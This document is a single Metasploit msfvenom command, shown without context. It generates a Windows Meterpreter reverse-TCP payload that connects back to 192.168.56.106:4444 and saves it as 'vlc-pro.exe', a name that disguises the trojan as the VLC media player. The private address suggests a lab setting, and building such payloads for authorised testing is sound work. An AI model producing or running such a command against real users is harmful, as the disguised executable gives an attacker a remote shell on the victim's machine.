```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.56.106 LPORT=4444 -f exe -o vlc-pro.exe
```